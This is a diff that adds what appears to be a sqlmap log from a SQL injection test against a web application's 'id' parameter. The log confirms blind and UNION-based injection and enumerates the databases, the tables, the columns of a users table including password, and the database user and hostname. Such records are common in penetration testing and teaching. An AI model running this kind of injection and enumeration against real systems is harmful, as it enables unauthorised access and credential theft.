@@ -1,0 +1,54 @@
+[*] starting @ 00:00:01 /2024-11-15/
+
+[00:00:02] [INFO] testing connection to the target URL
+[00:00:03] [INFO] checking if the target is protected by some kind of WAF/IPS
+[00:00:04] [INFO] testing if the target URL content is stable
+[00:00:05] [INFO] testing if GET parameter 'id' is dynamic
+[00:00:06] [INFO] confirming that GET parameter 'id' is dynamic
+[00:00:07] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind' injectable
+[00:00:08] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[00:00:09] [INFO] testing for SQL injection on GET parameter 'id'
+[00:00:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:00:11] [INFO] GET parameter 'id' is 'AND boolean-based blind' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others?
+[00:00:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[00:00:13] [INFO] target URL appears to have 6 columns in query
+[00:00:14] [INFO] GET parameter 'id' is 'Generic UNION query' injectable
+GET parameter 'id' is vulnerable (UNION query)
+available databases [5]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sys
+[*] webapp_db
+
+Database: webapp_db
+[4 tables]
++------------+
+| users      |
+| sessions   |
+| products   |
+| orders     |
++------------+
+
+Database: webapp_db
+Table: users
+[5 columns]
++------------+-------------+
+| Column     | Type        |
++------------+-------------+
+| id         | int         |
+| username   | varchar(50) |
+| password   | varchar(255)|
+| email      | varchar(100)|
+| created_at | datetime    |
++------------+-------------+
+
+current user: 'webapp_user'@'localhost'
+current database: 'webapp_db'
+current hostname: dbserver
+is DBA: False
+
+[00:00:20] [INFO] fetched data logged to text files under '/tmp/sqlmap-output'
+
+[*] ending @ 00:00:20 /2024-11-15/
